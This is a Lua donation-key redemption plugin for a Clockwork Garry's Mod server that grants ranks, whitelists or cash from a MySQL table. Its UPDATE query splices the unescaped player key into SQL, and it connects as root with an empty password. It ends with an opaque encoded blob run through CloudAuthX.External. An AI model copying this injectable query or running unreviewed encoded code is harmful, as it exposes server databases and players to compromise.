local PLUGIN = PLUGIN;
local SCHEMA = SCHEMA;
local Clockwork = Clockwork;

require( "mysqloo" )

-- Set your donation things here and obviously add more, example commands are given
-- This requires LUA knowledge.
-- These packages should match up with the web hosting packages. NUMBER WISE ASWELL!
package={}

package[1]= function(ply)

		ply:ChatPrint('You gave me money')
end

package[2]= function(ply)
		--this set's rank, you shouldn't really donate for ranks in seriusrp, but watever
		-- takes, operator or admin or superadmin
		nick = ply:Nick()
		local target = Clockwork.player:FindByID(nick)
		Clockwork.player:Notify(target, "Key Redeemed! You got: operator.");-- You change this
		target:SetClockworkUserGroup("operator");-- You change this
		Clockwork.player:LightSpawn(target, true, true);
end

package[3]= function(ply)
		--This gives a whitelist
		nick = ply:Nick()
		local target = Clockwork.player:FindByID(nick)
		Clockwork.player:Notify(target, "Key Redeemed! You got: Metropolice Force whitelist."); -- You change this
		Clockwork.player:SetWhitelisted(target, "Metropolice Force", true); -- You change this
		Clockwork.player:SaveCharacter(target);
end

package[4]= function(ply)
		--This gives money
		nick = ply:Nick()
		local target = Clockwork.player:FindByID(nick)
		Clockwork.player:Notify(target, "Key Redeemed! You got: 50 cash.");-- You change this
 		Clockwork.player:GiveCash(target, "50");-- You change this
end




function truConnectDatabase()
	db = mysqloo.connect( "127.0.0.1", "root", "", "donations", 3306 )
	function db:onConnected()
		print( "[CKR] Database has connected!" )
	end
	function db:onConnectionFailed( err )
		ErrorNoHalt( "[CKR] Connection to database failed!" )
		ErrorNoHalt( "[CKR] Error:", err )
	end
	db:connect()
end

	hook.Add("Initialize", "truConnectDatabase", truConnectDatabase)



	util.AddNetworkString("cl_sendDonationKey")

	net.Receive("cl_sendDonationKey", function(len,ply)
		local key = net.ReadString()
		CheckCode(ply,key)
	end)

	
function CheckCode(ply,code)
	local codequery = db:query("SELECT * FROM activationkeys WHERE activationkey='" .. db:escape(code) .. "' AND used=0")		
	codequery.onSuccess = function() -- Needs the callback for when the Query is completed | Even if there are no results to show
	local data = codequery:getData()
	local row = data[1]
		if (#data == 1) then -- If there is 1 Row (Table) returned for the Query
			-- Update database first, incase it errors
			local updatekey = db:query("UPDATE activationkeys SET used=1 WHERE activationkey='"..code.."' AND used=0")
			-- If it's successful redeem!
			updatekey.onSuccess = function()
				print('[CKR] Key Redeemed')
				package[tonumber(row['type'])](ply)
			end-- key update success
			updatekey.onError = function(db, err,ply)
				print('[CKR] Error! :', err)
				ply:ChatPrint('There was a error redeeming your key. Contact Owner')
			end -- update error
			updatekey:start()
			elseif (#data > 1) then
			-- Woah multiple keys returned!
			print('[CKR] Multiple Keys found! Error:', err)
			ply:ChatPrint('There was a error redeeming your key. Contact Owner')
		end -- if returned 1
		if (#data == 0) then
			print('[CKR] Key not found')
			ply:ChatPrint('No code found')
		end
	end --find key onsuccess
		codequery.onError = function(db, err,ply) -- Callback for an error that occurs during the Query.
			print('[CKR] Error! :', err) 
			ply:ChatPrint('There was a error redeeming your key. Contact Owner')
		end
		
	codequery:start()
		
end




CloudAuthX.External("CNirUsF7VfjjwwSHococXmzwYvmAQx43I8Eg9m2KlekP8iu1Lyn3x22BTEXO2YyX5JRsT76UjiR01hoJUT7O1zi4Fk3rijJvJ4tSYlAii+/uQb47YQdiVQsMh4ABvYMcBEcVnWC4UkG/e9O6yQiNcVvAvSdRnbZ+e2fEyWlxBk/AxQjbe3LkfOstxsyQGf+I9eyvaLU4HK2YvM3b5YkzmJW0i6a3cm0UjPx8TIKo0zCiTK7lwgk9IKxdifzSEq/MDkK5BN4CbTm7SjtrrtCsYXXcr9wVuz8ajtzOlf/DYQI+0MR6XIDdO/XtxO3BuPCGnsb13gumwtYfOLBlxZttmsjfWtNd1nqrhnf4PQCZuvBwKj/B0352R7xi0kRPU1LPQ3jjI0vvewzqsQcf5NQ9R+O9+Vf/hX2qJJuAtrp6dHz9ofRZSWbJ5x1ZgWz0/wWbLvpKf001irqLVu/5eUdH2F+qKu407Z/8SpPHIfzPd8d8wq8ntoVhjO9JuYm4UfevTc8Z83/tToYPwhRp4X1n52JYnO6BborC6S5kjlJ52+GMNRGtN5a8o6cvMi/BZ/wXhlLcx+GZUClmLjkQIE3BAsoKLEUuoThjblnK1HUh4rDiO4RLD6dkt/LbLPytq874BCNDfssz0YbVSzyMTaAn0WyKtxErNuagM2IRwJWywfR/oP16yeDhYHdscPgSO4z0HOYxJ2QbFxPxtwfNetmNtp3UGeHpkGohRv1PTZqS+sv3uPqbZR8Q5KYdPHMYw+V+a+AQi/pLU0xGyXk+LNtznYsj1Zz27z+8dNOdzCtDyo6p44WgKB8ZpEkpf53OiY4by28QrMGbm6ukZWrCKZXwWgk9ifBH3CMqko9D/3bjwEnsNVN2uPypL2ARlzTdECbI9iFsBsq9+BYOleVHQ7YYa22o3I8hb56X0F3TTezGzBCO+VgFK/9FScanbMyqVNNEG7qHLIVbiqd78m9fDPBNXxHKA8PUgTIOnOyQhkMN5U3d3PGIPw2xFwAOqkvxMk1LyNrjYarfDKLhZ5Ns6SB3pV39FofjwAGi0R92imkXxPAuKrbCS5QDea316mx7HtF4Qa97DdI+bRuDfY8vFW0r/2mr7RUMxkjEcN6sXTYzvOZlzaGbC0/LkXmz9fFe2nze");